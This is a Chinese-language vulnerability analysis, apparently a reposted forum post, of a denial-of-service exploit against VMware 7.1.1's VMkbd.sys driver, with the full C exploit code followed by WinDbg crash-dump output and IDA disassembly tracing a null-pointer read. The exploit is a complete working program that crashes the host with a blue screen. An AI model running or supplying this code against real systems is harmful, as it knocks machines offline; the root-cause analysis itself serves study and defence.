
# VM7.11Denial of Service Exploit 简单分析

> 原文：[`www.pediy.com/kssd/pediy11/121306.html`](https://www.pediy.com/kssd/pediy11/121306.html)

起因于 http://sebug.net/exploit/20129/这里

于是拿着试了下，刚编译完运行，帕，就 BSoD 了，郁闷死了。我还以为去虚拟机下试呢，*xxxx

下面是这个利用代码：

```c
#include "stdafx.h"

#include <windows.h>

#include <winioctl.h>

int main(int argc, char* argv[])
{

  HANDLE hFile;
  DWORD bYteR;
  hFile=CreateFileA("\\\\\\\.\\VMwareKbdFilter", GENERIC_READ | GENERIC_WRITE,0,NULL,OPEN_EXISTING,0,NULL);
  if (hFile!=INVALID_HANDLE_VALUE)
  {
    DWORD bRet=DeviceIoControl(hFile,0xb204c,NULL,0,NULL,0,&bYteR,NULL);
  }
  return 0;

}
```

BSoD 转储后，想想好几天没调试 BSoD 了，于是

，想看看咋回事，于是就拿出 windbg 和 ida 看看.........................

@:崩溃 dump

`DRIVER_IRQL_NOT_LESS_OR_EQUAL` (d1)

An attempt was made to access a pageable (or completely invalid) address at an

interrupt request level (IRQL) that is too high.  This is usually

caused by drivers using improper addresses.

If kernel debugger is available get stack backtrace.

Arguments:

Arg1: `00000000`, memory referenced

Arg2: `00000002`, IRQL

Arg3: `00000000`, value 0 = read operation, 1 = write operation

Arg4: `bac0134e`, address which referenced memory

Debugging Details:

\------------------

READ_ADDRESS:  `00000000`

CURRENT_IRQL:  `2`

FAULTING_IP:

`VMkbd+134e`

`bac0134e 8b17            mov     edx,dword ptr [edi]`

DEFAULT_BUCKET_ID:  `INTEL_CPU_MICROCODE_ZERO`

BUGCHECK_STR:  `0xD1`

PROCESS_NAME:  `Vm711.exe`

TRAP_FRAME:  `ad8cfba0` -- (`.trap 0xffffffffad8cfba0`)

ErrCode = `00000000`

eax=`887a44c8` ebx=`806d36e0` ecx=`89bbff78` edx=`00000000` esi=`887a4458` edi=`00000000`

eip=`bac0134e` esp=`ad8cfc14` ebp=`ad8cfc1c` iopl=0         nv up ei pl zr na pe nc

cs=`0008`  ss=`0010`  ds=`0023`  es=`0023`  fs=`0030`  gs=`0000`             efl=`00010246`

`VMkbd+0x134e`:

`bac0134e 8b17            mov     edx,dword ptr [edi]`  ds:0023:00000000=`????????`

Resetting default scope

LAST_CONTROL_TRANSFER:  from `bac0134e` to `80541683`

STACK_TEXT:

`ad8cfba0 bac0134e badb0d00 00000000 006bafc0 nt!KiTrap0E+0x233`

WARNING: Stack unwind information not available. Following frames may be wrong.

`ad8cfc1c bac014db 89af9318 89b8f950 887a4458 VMkbd+0x134e`

`ad8cfc34 804ef119 89bbfec0 007a4458 806d32d0 VMkbd+0x14db`

`ad8cfc44 80575d5e 887a44c8 89af9318 887a4458 nt!IopfCallDriver+0x31`

`ad8cfc58 80576bff 89bbfec0 887a4458 89af9318 nt!IopSynchronousServiceTail+0x70`

`ad8cfd00 8056f46c 00000038 00000000 00000000 nt!IopXxxControlFile+0x5e7`

`ad8cfd34 8053e638 00000038 00000000 00000000 nt!NtDeviceIoControlFile+0x2a`

`ad8cfd34 7c92e4f4 00000038 00000000 00000000 nt!KiFastCallEntry+0xf8`

`0013ff00 00000000 00000000 00000000 00000000 0x7c92e4f4`

STACK_COMMAND:  `kb`

FOLLOWUP_IP:

`VMkbd+134e`

`bac0134e 8b17            mov     edx,dword ptr [edi]`

SYMBOL_STACK_INDEX:  `1`

SYMBOL_NAME:  `VMkbd+134e`

FOLLOWUP_NAME:  MachineOwner

MODULE_NAME: `VMkbd`

IMAGE_NAME:  `VMkbd.sys`

DEBUG_FLR_IMAGE_TIMESTAMP:  `4c55c022`

FAILURE_BUCKET_ID:  `0xD1_VMkbd+134e`

BUCKET_ID:  `0xD1_VMkbd+134e`

Followup: MachineOwner

---------

kd> u `VMkbd+0x134e`

`VMkbd+0x134e`:

`bac0134e 8b17            mov     edx,dword ptr [edi]`

`bac01350 4a              dec     edx`

`bac01351 6bd21c          imul    edx,edx,1Ch`

`bac01354 83c220          add     edx,20h`

`bac01357 395008          cmp     dword ptr [eax+8],edx`

`bac0135a 7407            je      VMkbd+0x1363 (bac01363)`

`bac0135c b8060200c0      mov     eax,0C0000206h`

`bac01361 eb24            jmp     VMkbd+0x1387 (bac01387)`

.........................................

这里看不出来什么，只知道是 `mov     edx,dword ptr [edi]`这句访问了 0 地址

引发了蓝屏

@：IDA 分析

于是拿出 ida 分析这个 `VMkbd.sys`

从 `DriverEntry` 直接找到

`DriverObject->MajorFunction[14]` = `(PDRIVER_DISPATCH)DeviceIoControl;`（这个 `DeviceIoControl` 我改名字的）得到 IoControl 的分发位置

```c
int __thiscall DeviceIoControl(void *DeviceExtension, int pDevObj, int Irp)
{
  int v3;  // ecx@1
  KIRQL v5;  // al@3
  unsigned int IoCode;  // ecx@3
  int v7;  // ecx@3
  int v8;  // edi@3
  int TempIrp;  // esi@3
  int v10;  // ecx@5
  int v11;  // ecx@6
  int v12;  // ecx@7
  int v13;  // ecx@8
  signed int v14;  // eax@10
  NTSTATUS v15;  // edi@15
  void *v16;  // edi@17
  int v17;  // ecx@21
  int v18;  // ecx@22
  int v19;  // ecx@23
  int v20;  // ecx@24
  int v21;  // eax@33
  signed int v22;  // [sp-10h] [bp-14h]@11
  char v23;  // [sp-10h] [bp-14h]@27
  PVOID Object;  // [sp+0h] [bp-4h]@1
  KIRQL v25;  // [sp+13h] [bp+Fh]@3
  Object = DeviceExtension;
  v3 = *(_DWORD *)(pDevObj + 40);
  if (*(_DWORD *)v3 == 1 )
    return sub_10666(v3, Irp);
  v7 = dword_12328;
  TempIrp = Irp;
  *(_DWORD *)(Irp + 28) = 0;
  v8 = *(_DWORD *)(Irp + 96);
  v5 = ((int (__thiscall *)(int))KfAcquireSpinLock)(v7 + 24);
  IoCode = *(_DWORD *)(v8 + 12);
  v25 = v5;
  if ( IoCode > 0xB2040 )                       // 传来的是 0xb204c
  {
    v17 = IoCode - 729156;                      // v17=8
    if ( v17 )
    {
      v18 = v17 - 4;                            // V18=4
      if ( v18 )
      {
        v19 = v18 - 4;                          // v19=0
        if ( !v19 )
        {                                       // 这里将会执行，我给他命名为//BosdFunc
          v14 = BosdFunc(pDevObj, TempIrp); //这个函数引发了蓝屏，跳过去看看
          goto LABEL_15;
        }
        v20 = v19 - 4;
        if ( v20 )
        {
          if ( v20 != 4 )
            goto LABEL_26;
          v23 = 1;
        }
        else
        {
          v23 = 0;
        }
        v14 = sub_10B3A(v23);
        goto LABEL_15;
      }
```

//

//.text:0001133E BosdFunc proc near               ; CODE XREF: DeviceIoControl+146p

.text:0001133E

.text:0001133E var_4           = dword ptr -4

.text:0001133E

.text:0001133E                mov     edi, edi

.text:00011340                push    ebp

.text:00011341                mov     ebp, esp

.text:00011343                push    ecx   //此时 ecx 指向了 DeviceObject

  //esi 指向了 Irp

.text:00011344                mov     eax, [esi+60h]

.text:00011347                mov     ecx, [ecx+28h]

.text:0001134A                push    edi

.text:0001134B                mov     edi, [esi+0Ch]  //从 IRP 结构知道，

这里是 AssociatedIrp

.text:0001134E                mov     edx, [edi]      ; 从 windbg 看到是这出引发了 bosd

.text:00011350                dec     edx

.text:00011351                imul    edx, 1Ch

.text:00011354                add     edx, 20h

.text:00011357                cmp     [eax+8], edx

.text:0001135A                jz      short loc_11363

@：回到 windbg 中

//从上面分析可以知道，esi 指向了 irp

//而 esi=887a4458

kd> dt nt!_IRP 887a4458

   +0x000 Type             : 6

   +0x002 Size             : 0x94

   +0x004 MdlAddress       : (null)

   +0x008 Flags            : 0

   +0x00c AssociatedIrp    : __unnamed

   +0x010 ThreadListEntry  : _LIST_ENTRY [ 0x8879ed38 - 0x8879ed38 ]

   +0x018 IoStatus         : _IO_STATUS_BLOCK

   +0x020 RequestorMode    : 1 ''

   +0x021 PendingReturned  : 0 ''

   +0x022 StackCount       : 1 ''

   +0x023 CurrentLocation  : 1 ''

   +0x024 Cancel           : 0 ''

   +0x025 CancelIrql       : 0 ''

   +0x026 ApcEnvironment   : 0 ''

   +0x027 AllocationFlags  : 0xc ''

   +0x028 UserIosb         : 0x0013fedc _IO_STATUS_BLOCK

   +0x02c UserEvent        : (null)

   +0x030 Overlay          : __unnamed

   +0x038 CancelRoutine    : (null)

   +0x03c UserBuffer       : (null)

   +0x040 Tail             : __unnamed
